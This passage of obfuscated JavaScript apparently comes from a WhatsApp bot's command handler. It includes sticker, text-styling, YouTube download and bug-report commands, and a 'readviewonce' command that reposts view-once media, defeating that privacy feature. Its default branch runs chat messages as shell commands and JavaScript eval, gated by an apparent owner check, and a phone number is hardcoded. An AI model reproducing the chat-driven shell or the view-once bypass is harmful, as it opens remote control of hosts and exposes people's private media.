"\n - Current Time: " + (_0x100680.timezone?.["current_time"] || "N/A") + "\n");
          } catch (_0x416a24) {
            _0x44490c.reply("Error: Unable to retrieve data for IP " + _0x32d59b);
          }
        }
        break;
      case 'report':
        {
          if (!_0x32d59b) {
            return _0x44490c.reply("use .report \n> command name that isnt working you can also report with a screenshot");
          }
          _0x38cbcb.sendMessage(_0x44490c.chat, {
            'react': {
              'text': '📜',
              'key': _0x44490c.key
            }
          });
          if (/image/.test(_0x5a1980)) {
            if (!_0x87515f) {
              return _0x44490c.reply("reply to an image");
            }
            if (!_0x32d59b) {
              return _0x44490c.reply("where the text to report to dev?");
            }
            let _0x57e91a = await _0x87515f.download();
            let _0x1434e7 = await _0x11ccf6(_0x57e91a);
            _0x44490c.reply("Thank you for your input, your report will be forwarded to the developer.");
            _0x38cbcb.sendImage("2348102487241@s.whatsapp.net", _0x1434e7, "[ system notice ] \nThere is an error report from @" + _0x44490c.sender.split('@')[0x0] + "\nMessage : " + _0x32d59b, _0x44490c);
          } else {
            _0x44490c.reply("Thank you for your input, your report will be forwarded to the developer.");
            _0x38cbcb.reply("2348102487241@s.whatsapp.net", "[ system notice ]\nThere is an error report from @" + _0x44490c.sender.split('@')[0x0] + "\nmessage : " + _0x32d59b, _0x44490c);
          }
        }
        break;
      case "ttp":
      case "write":
        {
          if (!_0x32d59b) {
            return _0x44490c.reply("use " + (_0x4b9d86 + _0x259a4d) + " Ednut is a king");
          }
          const _0x1bdb5a = require('text2png');
          await fs.writeFileSync("out.png", _0x1bdb5a(q, {
            'font': "100px coolvetica rg",
            'localFontPath': "all/font/coolvetica rg.otf",
            'localFontName': "coolvetica rg",
            'color': "white",
            'textAlign': 'left',
            'lineSpacing': 0xa,
            'strokeColor': 'black',
            'strokeWidth': 0x2,
            'padding': 0x14
          }));
          let {
            Sticker: _0x369bf9,
            createSticker: _0x12ad6e,
            StickerTypes: _0x44f07a
          } = require("wa-sticker-formatter");
          let _0x2e0555 = fs.readFileSync("out.png");
          let _0x4eca76 = new _0x369bf9(_0x2e0555, {
            'pack': 'hello',
            'author': 'hi',
            'type': _0x44f07a.FULL,
            'categories': ['🤩', '🎉'],
            'id': "12345",
            'quality': 0x46,
            'background': "#FFFFFF00"
          });
          let _0x731bc9 = _0x290b0a(".webp");
          let _0x4cd582 = await _0x4eca76.toFile(_0x731bc9);
          let _0x106c26 = fs.readFileSync(_0x4cd582);
          await _0x38cbcb.sendMessage(_0x44490c.chat, {
            'sticker': _0x106c26
          }, {
            'quoted': _0x44490c
          });
          await fs.unlinkSync(_0x731bc9);
          await fs.unlinkSync("out.png");
        }
        break;
      case "readmore":
        {
          const _0x4cbcd5 = String.fromCharCode(0x200e);
          const _0x40e8e9 = _0x4cbcd5.repeat(0xfa1);
          let [_0x47bd83, _0x47b97f] = _0x32d59b.split`|`;
          if (!_0x47bd83) {
            _0x47bd83 = '';
          }
          if (!_0x47b97f) {
            _0x47b97f = '';
          }
          _0x38cbcb.sendMessage(_0x44490c.chat, {
            'text': _0x47bd83 + _0x40e8e9 + _0x47b97f
          }, {
            'quoted': _0x44490c
          });
        }
        break;
      case 'vv':
      case "readviewonce":
        {
          if (!_0x44490c.quoted) {
            return _0x44490c.reply("Reply view once message to use this command.");
          }
          _0x38cbcb.sendMessage(_0x44490c.chat, {
            'react': {
              'text': '👀',
              'key': _0x44490c.key
            }
          });
          await _0x57794f();
          let _0x17dee4 = Object.keys(_0x44490c.quoted.message)[0x0];
          let _0x488aa3 = _0x44490c.quoted.message[_0x17dee4];
          var _0x3b72e5 = await downloadContentFromMessage(_0x488aa3, _0x17dee4 == 'imageMessage' ? "image" : "video");
          let _0x4fa97c = Buffer.from([]);
          for await (let _0x2ec7cc of _0x3b72e5) {
            _0x4fa97c = Buffer.concat([_0x4fa97c, _0x2ec7cc]);
          }
          if (/video/.test(_0x17dee4)) {
            await _0x38cbcb.sendMessage(_0x44490c.chat, {
              'video': _0x4fa97c,
              'caption': _0x488aa3.caption
            }, {
              'quoted': _0x44490c
            });
          } else if (/image/.test(_0x17dee4)) {
            await _0x38cbcb.sendMessage(_0x44490c.chat, {
              'image': _0x4fa97c,
              'caption': _0x488aa3.caption
            }, {
              'quoted': _0x44490c
            });
          }
        }
        break;
      case "fancy":
      case "styletext":
        {
          let {
            styletext: _0x22f68e
          } = require("./all/scraper");
          if (!_0x32d59b) {
            return _0x44490c.reply("Enter Query text!");
          }
          _0x38cbcb.sendMessage(_0x44490c.chat, {
            'react': {
              'text': '📯',
              'key': _0x44490c.key
            }
          });
          await _0x57794f();
          let _0x5ac982 = await _0x22f68e(_0x32d59b);
          let _0x2904a9 = "Style Text From " + _0x32d59b + "\n\n";
          for (let _0x5d04fc of _0x5ac982) {
            _0x2904a9 += global.simbol + " " + _0x5d04fc.name + " : " + _0x5d04fc.result + "\n\n";
          }
          _0x44490c.reply(_0x2904a9);
        }
        break;
      case "ytvideo":
      case "ytmp4":
        {
          if (!_0x32d59b) {
            return _0x44490c.reply("Example  :\n> .ytmp4 <ytv link>");
          }
          await _0x57794f();
          try {
            _0x44490c.reply("Video process time might take 1-3 minute!");
            let _0x194d2 = await (await fetch("https://widipe.com/download/ytdl?url=" + _0x32d59b)).json();
            let _0x51cedf = _0x194d2.result.mp4;
            const _0x506315 = "Arch Md YouTube downloader 🦄\n  title " + _0x194d2.result.title + "\n  \n  © " + botname;
            _0x38cbcb.sendMessage(_0x44490c.chat, {
              'video': {
                'url': _0x51cedf
              },
              'caption': _0x506315
            }, {
              'quoted': _0x44490c
            });
          } catch (_0x250c29) {
            _0x44490c.reply("server error : " + _0x250c29);
          }
        }
        break;
      default:
        if (_0x416b1f.startsWith('$')) {
          if (!_0x402f36) {
            return;
          }
          exec(_0x416b1f.slice(0x2), (_0x397e1d, _0x28f011) => {
            if (_0x397e1d) {
              return _0x38cbcb.sendMessage(_0x44490c.chat, {
                'text': _0x397e1d.toString()
              }, {
                'quoted': _0x44490c
              });
            }
            if (_0x28f011) {
              return _0x38cbcb.sendMessage(_0x44490c.chat, {
                'text': util.format(_0x28f011)
              }, {
                'quoted': _0x44490c
              });
            }
          });
        }
        if (_0x416b1f.startsWith('>')) {
          if (!_0x402f36) {
            return;
          }
          try {
            let _0x477d52 = await eval(_0x32d59b);
            if (typeof _0x477d52 !== "string") {
              _0x477d52 = util.inspect(_0x477d52);
            }
            _0x38cbcb.sendMessage(_0x44490c.chat, {
              'text': util.format(_0x477d52)
            }, {
              'quoted': _0x44490c
            });
          } catch (_0x3ef208) {
            _0x38cbcb.sendMessage(_0x44490c.chat, {
              'text': util.format(_0x3ef208)
            }, {
              'quoted': _0x44490c
            });
          }
        }
        if (_0x416b1f.startsWith('=>')) {
          if (!_0x402f36) {
            return;
          }
          try {
            const _0x2249cf = await eval(";(async () => { " + _0x32d59b + " })();");
            return _0x38cbcb.sendMessage(_0x44490c.chat, {
              'text': util.format(_0x2249cf)
            }, {
              'quoted': _0x44490c
            });
          } catch (_0x520854) {
            return _0x38cbcb.sendMessage(_0x44490c.chat, {
              'text': util.format(_0x520854)
            }, {
              'quoted': _0x44490c
            });
          }
        }
    }
  } catch (_0x285d55) {
    console.log(_0x285d55);
    _0x38cbcb.sendMessage(owner + '@s.whatsapp.net', {
      'text': '' + util.format(_0x285d55)
    });
  }
};
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright("Update " + __filename));
  delete require.cache[file];
  require(file);
});